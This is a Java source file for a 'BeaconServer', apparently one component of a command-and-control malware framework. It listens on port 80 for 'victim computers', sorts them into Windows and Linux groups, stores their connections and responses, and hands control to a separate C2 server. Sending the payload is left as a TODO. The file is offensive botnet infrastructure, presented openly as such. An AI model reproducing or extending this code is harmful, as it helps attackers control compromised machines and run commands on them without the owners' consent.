package Servers.Beacon;

import java.util.Scanner;
import Servers.Duplexer;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;

public class BeaconServer implements Runnable{
    // Dictionaries to Map IP's to Duplexer Pointers, and IP's to Responses from individual clients
    private HashMap<String,Duplexer> windowsClients;
    private HashMap<String,ArrayList<String>> windowsClientResponses;
    private HashMap<String,Duplexer> linuxClients;
    private HashMap<String,ArrayList<String>> linuxClientResponses;

    // Pointer to the Thread responsible for interacting with the C2 Server
    private BeaconC2Handler C2Handler;

    // Socket that is listentning for connections from clients (victim computers)
    private ServerSocket serverSocket;

    /**
     * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
     * back to the C2 Server.
     * 
     * @param C2ServerIPAddress IP Address of the C2 Server
     * @throws IOException
     */
    public BeaconServer(String C2ServerIPAddress) throws IOException{
        this.windowsClients = new HashMap<>();
        this.windowsClientResponses = new HashMap<>();
        this.linuxClients = new HashMap<>();
        this.linuxClientResponses = new HashMap<>();
        this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress);
        this.serverSocket = new ServerSocket(80);
    }

    @Override
    public void run(){
        // Start the thread that interacts with the C2 Server
        C2Handler.run();
        // Always listening for clients
        while(true){
            try{
                // Accept new client
                Socket socket = serverSocket.accept();
                Duplexer duplexer = new Duplexer(socket);
                // Get clients IP Address
                String IPAddress = socket.getRemoteSocketAddress().toString();
                // Add to client list
                String OSMessage = duplexer.receive();
                if(OSMessage.equals("Windows")){
                    windowsClients.put(IPAddress,duplexer);
                    windowsClientResponses.put(IPAddress, new ArrayList<String>());
                    // TODO: Send Payload back on the client's initial join
                }else if(OSMessage.equals("Linux")){
                    linuxClients.put(IPAddress,duplexer);
                    linuxClientResponses.put(IPAddress, new ArrayList<String>());
                    // TODO: Send Payload back on the client's initial join
                }
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args){
        Scanner userScanner = new Scanner(System.in);
        System.out.print("Enter C2 Server IP Address: ");
        String C2ServerIPAddress = userScanner.next();
        try{
            BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress);
            beaconServer.run();
        } catch(IOException e){
            e.printStackTrace();
        }
        userScanner.close();
    }
}
